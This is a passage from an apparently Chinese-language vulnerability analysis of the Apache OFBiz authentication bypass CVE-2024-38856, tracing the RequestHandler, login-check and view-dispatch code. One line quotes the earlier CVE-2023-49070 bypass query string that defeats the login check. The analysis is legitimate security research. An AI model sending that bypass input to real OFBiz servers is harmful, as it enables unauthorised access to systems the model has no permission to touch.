&#123;</span><br><span class="line">                        request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, returnString);</span><br><span class="line">                    &#125;</span><br><span class="line">                    eventReturn = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">if</span> (!requestMap.requestResponseMap.containsKey(<span class="string">&quot;protect&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (ccfg.getProtectView() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            overrideViewUri = ccfg.getProtectView();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            overrideViewUri = EntityUtilProperties.getPropertyValue(<span class="string">&quot;security&quot;</span>, <span class="string">&quot;default.error.response.view&quot;</span>, delegator);</span><br><span class="line">                            overrideViewUri = overrideViewUri.replace(<span class="string">&quot;view:&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (<span class="string">&quot;none:&quot;</span>.equals(overrideViewUri)) &#123;</span><br><span class="line">                                interruptRequest = <span class="keyword">true</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (EventHandlerException e) &#123;</span><br><span class="line">            Debug.logError(e, <span class="keyword">module</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果以上预处理均通过之后，接下来则会判断路由是否需要认证</p><p><img src="/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240623212746207.png" alt="image-20240623212746207"></p><p>如果需要认证则会取<code>checkLogin</code>对应的事件做处理并判断，从配置中可以看到，这个校验是通过方法<code>org.apache.ofbiz.webapp.control.LoginWorker#extensionCheckLogin</code>完成(还记得么，CVE-2023-49070就是通过?USERNAME=&amp;PASSWORD=s&amp;requirePasswordChange=Y绕过了此处的登录校验)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;checkLogin&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Verify a user is logged in.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;true&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;java&quot;</span> <span class="attr">path</span>=<span class="string">&quot;org.apache.ofbiz.webapp.control.LoginWorker&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;extensionCheckLogin&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;main&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;impersonated&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;impersonated&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;login&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在之后则会调用我们url相关配置中对应的事件(这里需要注意如果事件返回为空则nextRequestResponse = ConfigXMLReader.emptyNoneRequestResponse)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Invoke the defined event (unless login failed)</span></span><br><span class="line"><span class="keyword">if</span> (eventReturn == <span class="keyword">null</span> &amp;&amp; requestMap.event != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (requestMap.event.type != <span class="keyword">null</span> &amp;&amp; requestMap.event.path != <span class="keyword">null</span> &amp;&amp; requestMap.event.invoke != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">long</span> eventStartTime = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// run the request event</span></span><br><span class="line">            eventReturn = <span class="keyword">this</span>.runEvent(request, response, requestMap.event, requestMap, <span class="string">&quot;request&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (requestMap.event.metrics != <span class="keyword">null</span>) &#123;</span><br><span class="line">                requestMap.event.metrics.recordServiceRate(<span class="number">1</span>, System.currentTimeMillis() - startTime);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// save the server hit for the request event</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.trackStats(request)) &#123;</span><br><span class="line">                ServerHitBin.countEvent(cname + <span class="string">&quot;.&quot;</span> + requestMap.event.invoke, request, eventStartTime,</span><br><span class="line">                        System.currentTimeMillis() - eventStartTime, userLogin);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// set the default event return</span></span><br><span class="line">            <span class="keyword">if</span> (eventReturn == <span class="keyword">null</span>) &#123;</span><br><span class="line">                nextRequestResponse = ConfigXMLReader.emptyNoneRequestResponse;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (EventHandlerException e) &#123;</span><br><span class="line">            <span class="comment">// check to see if there is an &quot;error&quot; response, if so go there and make an request error message</span></span><br><span class="line">            <span class="keyword">if</span> (requestMap.requestResponseMap.containsKey(<span class="string">&quot;error&quot;</span>)) &#123;</span><br><span class="line">                eventReturn = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                Locale locale = UtilHttp.getLocale(request);</span><br><span class="line">                String errMsg = UtilProperties.getMessage(<span class="string">&quot;WebappUiLabels&quot;</span>, <span class="string">&quot;requestHandler.error_call_event&quot;</span>, locale);</span><br><span class="line">                request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, errMsg + <span class="string">&quot;: &quot;</span> + e.toString());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RequestHandlerException(<span class="string">&quot;Error calling event and no error response was specified&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于我们举例说明的login，从配置看则是调用<code>org.apache.ofbiz.webapp.control.LoginWorker#login</code>完成登录</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;login&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;true&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;java&quot;</span> <span class="attr">path</span>=<span class="string">&quot;org.apache.ofbiz.webapp.control.LoginWorker&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;login&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;main&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;requirePasswordChange&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;requirePasswordChange&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;login&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来的代码逻辑，如果登陆不成功，则会重定向跳转并返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// if previous request exists, and a login just succeeded, do that now.</span></span><br><span class="line"><span class="keyword">if</span> (previousRequest != <span class="keyword">null</span> &amp;&amp; loginPass != <span class="keyword">null</span> &amp;&amp; <span class="string">&quot;TRUE&quot;</span>.equalsIgnoreCase(loginPass)) &#123;</span><br><span class="line">    request.getSession().removeAttribute(<span class="string">&quot;_PREVIOUS_REQUEST_&quot;</span>);</span><br><span class="line">    <span class="comment">// special case to avoid login/logout looping: if request was &quot;logout&quot; before the login, change to null for default success view; do the same for &quot;login&quot; to avoid going back to the same page</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;logout&quot;</span>.equals(previousRequest) || <span class="string">&quot;/logout&quot;</span>.equals(previousRequest) || <span class="string">&quot;login&quot;</span>.equals(previousRequest) || <span class="string">&quot;/login&quot;</span>.equals(previousRequest) || <span class="string">&quot;checkLogin&quot;</span>.equals(previousRequest) || <span class="string">&quot;/checkLogin&quot;</span>.equals(previousRequest) || <span class="string">&quot;/checkLogin/login&quot;</span>.equals(previousRequest)) &#123;</span><br><span class="line">        Debug.logWarning(<span class="string">&quot;Found special _PREVIOUS_REQUEST_ of [&quot;</span> + previousRequest + <span class="string">&quot;], setting to null to avoid problems, not running request again&quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Debug.infoOn()) Debug.logInfo(<span class="string">&quot;[Doing Previous Request]: &quot;</span> + previousRequest + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// note that the previous form parameters are not setup (only the URL ones here), they will be found in the session later and handled when the old request redirect comes back</span></span><br><span class="line">        Map&lt;String, Object&gt; previousParamMap = UtilGenerics.checkMap(request.getSession().getAttribute(<span class="string">&quot;_PREVIOUS_PARAM_MAP_URL_&quot;</span>), String.class, Object.class);</span><br><span class="line">        String queryString = UtilHttp.urlEncodeArgs(previousParamMap, <span class="keyword">false</span>);</span><br><span class="line">        String redirectTarget = previousRequest;</span><br><span class="line">        <span class="keyword">if</span> (UtilValidate.isNotEmpty(queryString)) &#123;</span><br><span class="line">            redirectTarget += <span class="string">&quot;?&quot;</span> + queryString;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        callRedirect(makeLink(request, response, redirectTarget), response, request, ccfg.getStatusCodeString());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ConfigXMLReader.RequestResponse successResponse = requestMap.requestResponseMap.get(<span class="string">&quot;success&quot;</span>);</span><br></pre></td></tr></table></figure><p>如果成功则继续向下执行，接下来会根据我们的返回结果选择对应视图</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置下一个视图（如果成功，则不使用事件返回，而默认使用下一个视图（如果为 null，则稍后将其设置为 eventReturn）；即使成功，如果响应类型为“none”，也忽略下一个视图，换句话说使用 eventReturn）</span></span><br><span class="line">        <span class="keyword">if</span> (eventReturnBasedRequestResponse != <span class="keyword">null</span> &amp;&amp; (!<span class="string">&quot;success&quot;</span>.equals(eventReturnBasedRequestResponse.name) || <span class="string">&quot;none&quot;</span>.equals(eventReturnBasedRequestResponse.type))) nextRequestResponse = eventReturnBasedRequestResponse;</span><br><span class="line"></span><br><span class="line">ConfigXMLReader.RequestResponse successResponse = requestMap.requestResponseMap.get(<span class="string">&quot;success&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ((eventReturn == <span class="keyword">null</span> || <span class="string">&quot;success&quot;</span>.equals(eventReturn)) &amp;&amp; successResponse != <span class="keyword">null</span> &amp;&amp; <span class="string">&quot;request&quot;</span>.equals(successResponse.type)) &#123;</span><br><span class="line">    <span class="comment">// chains will override any url defined views; but we will save the view for the very end</span></span><br><span class="line">    <span class="keyword">if</span> (UtilValidate.isNotEmpty(overrideViewUri)) &#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;_POST_CHAIN_VIEW_&quot;</span>, overrideViewUri);</span><br><span class="line">    &#125;</span><br><span class="line">    nextRequestResponse = successResponse;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure we have some sort of response to go to</span></span><br><span class="line"><span class="keyword">if</span> (nextRequestResponse == <span class="keyword">null</span>) nextRequestResponse = successResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextRequestResponse == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> RequestHandlerException(<span class="string">&quot;Illegal response; handler could not process request [&quot;</span> + requestMap.uri + <span class="string">&quot;] and event return [&quot;</span> + eventReturn + <span class="string">&quot;].&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据视图类型决定下一步操作的执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;url&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a URL redirect.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line">    callRedirect(nextRequestResponse.value, response, request, ccfg.getStatusCodeString());</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;url-redirect&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">    <span class="comment">// check for a cross-application redirect</span></span><br><span class="line">    <span class="keyword">if</span> (Debug.verboseOn())</span><br><span class="line">        Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a URL redirect with redirect parameters.&quot;</span></span><br><span class="line">                + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line">    callRedirect(nextRequestResponse.value + <span class="keyword">this</span>.makeQueryString(request, nextRequestResponse), response,</span><br><span class="line">            request, ccfg.getStatusCodeString());</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;cross-redirect&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">    <span class="comment">// check for a cross-application redirect</span></span><br><span class="line">    <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a Cross-Application redirect.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line">    String url = nextRequestResponse.value.startsWith(<span class="string">&quot;/&quot;</span>) ? nextRequestResponse.value : <span class="string">&quot;/&quot;</span> + nextRequestResponse.value;</span><br><span class="line">    callRedirect(url + <span class="keyword">this</span>.makeQueryString(request, nextRequestResponse), response, request, ccfg.getStatusCodeString());</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;request-redirect&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a Request redirect.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line">    callRedirect(makeLinkWithQueryString(request, response, <span class="string">&quot;/&quot;</span> + nextRequestResponse.value, nextRequestResponse), response, request, ccfg.getStatusCodeString());</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;request-redirect-noparam&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a Request redirect with no parameters.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line">    callRedirect(makeLink(request, response, nextRequestResponse.value), response, request, ccfg.getStatusCodeString());</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;view&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a view.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check for an override view, only used if &quot;success&quot; = eventReturn</span></span><br><span class="line">    String viewName = (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == <span class="keyword">null</span> || <span class="string">&quot;success&quot;</span>.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;</span><br><span class="line">    renderView(viewName, requestMap.securityExternalView, request, response, saveName);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;view-last&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a view.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check for an override view, only used if &quot;success&quot; = eventReturn</span></span><br><span class="line">    String viewName = (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == <span class="keyword">null</span> || <span class="string">&quot;success&quot;</span>.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// as a further override, look for the _SAVED and then _HOME and then _LAST session attributes</span></span><br><span class="line">    Map&lt;String, Object&gt; urlParams = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;_SAVED_VIEW_NAME_&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        viewName = (String) session.getAttribute(<span class="string">&quot;_SAVED_VIEW_NAME_&quot;</span>);</span><br><span class="line">        urlParams = UtilGenerics.&lt;String, Object&gt;checkMap(session.getAttribute(<span class="string">&quot;_SAVED_VIEW_PARAMS_&quot;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;_HOME_VIEW_NAME_&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        viewName = (String) session.getAttribute(<span class="string">&quot;_HOME_VIEW_NAME_&quot;</span>);</span><br><span class="line">        urlParams = UtilGenerics.&lt;String, Object&gt;checkMap(session.getAttribute(<span class="string">&quot;_HOME_VIEW_PARAMS_&quot;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;_LAST_VIEW_NAME_&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        viewName = (String) session.getAttribute(<span class="string">&quot;_LAST_VIEW_NAME_&quot;</span>);</span><br><span class="line">        urlParams = UtilGenerics.&lt;String, Object&gt;checkMap(session.getAttribute(<span class="string">&quot;_LAST_VIEW_PARAMS_&quot;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (UtilValidate.isNotEmpty(nextRequestResponse.value)) &#123;</span><br><span class="line">        viewName = nextRequestResponse.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (UtilValidate.isEmpty(viewName) &amp;&amp; UtilValidate.isNotEmpty(nextRequestResponse.value)) &#123;</span><br><span class="line">        viewName = nextRequestResponse.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (urlParams != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; urlParamEntry: urlParams.entrySet()) &#123;</span><br><span class="line">            String key = urlParamEntry.getKey();</span><br><span class="line">            <span class="comment">// Don&#x27;t overwrite messages coming from the current event</span></span><br><span class="line">            <span class="keyword">if</span> (!(<span class="string">&quot;_EVENT_MESSAGE_&quot;</span>.equals(key) || <span class="string">&quot;_ERROR_MESSAGE_&quot;</span>.equals(key)</span><br><span class="line">                    || <span class="string">&quot;_EVENT_MESSAGE_LIST_&quot;</span>.equals(key) || <span class="string">&quot;_ERROR_MESSAGE_LIST_&quot;</span>.equals(key))) &#123;</span><br><span class="line">                request.setAttribute(key, urlParamEntry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    renderView(viewName, requestMap.securityExternalView, request, response, <span class="keyword">null</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;view-last-noparam&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">     <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a view.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// check for an override view, only used if &quot;success&quot; = eventReturn</span></span><br><span class="line">     String viewName = (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == <span class="keyword">null</span> || <span class="string">&quot;success&quot;</span>.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// as a further override, look for the _SAVED and then _HOME and then _LAST session attributes</span></span><br><span class="line">     <span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;_SAVED_VIEW_NAME_&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">         viewName = (String) session.getAttribute(<span class="string">&quot;_SAVED_VIEW_NAME_&quot;</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;_HOME_VIEW_NAME_&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">         viewName = (String) session.getAttribute(<span class="string">&quot;_HOME_VIEW_NAME_&quot;</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;_LAST_VIEW_NAME_&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">         viewName = (String) session.getAttribute(<span class="string">&quot;_LAST_VIEW_NAME_&quot;</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (UtilValidate.isNotEmpty(nextRequestResponse.value)) &#123;</span><br><span class="line">         viewName = nextRequestResponse.value;</span><br><span class="line">     &#125;</span><br><span class="line">     renderView(viewName, requestMap.securityExternalView, request, response, <span class="keyword">null</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;view-home&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a view.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check for an override view, only used if &quot;success&quot; = eventReturn</span></span><br><span class="line">    String viewName = (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == <span class="keyword">null</span> || <span class="string">&quot;success&quot;</span>.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// as a further override, look for the _HOME session attributes</span></span><br><span class="line">    Map&lt;String, Object&gt; urlParams = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;_HOME_VIEW_NAME_&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        viewName = (String) session.getAttribute(<span class="string">&quot;_HOME_VIEW_NAME_&quot;</span>);</span><br><span class="line">        urlParams = UtilGenerics.&lt;String, Object&gt;checkMap(session.getAttribute(<span class="string">&quot;_HOME_VIEW_PARAMS_&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (urlParams != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; urlParamEntry: urlParams.entrySet()) &#123;</span><br><span class="line">            request.setAttribute(urlParamEntry.getKey(), urlParamEntry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    renderView(viewName, requestMap.securityExternalView, request, response, <span class="keyword">null</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;none&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">    <span class="comment">// no view to render (meaning the return was processed by the event)</span></span><br><span class="line">    <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is handled by the event.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span 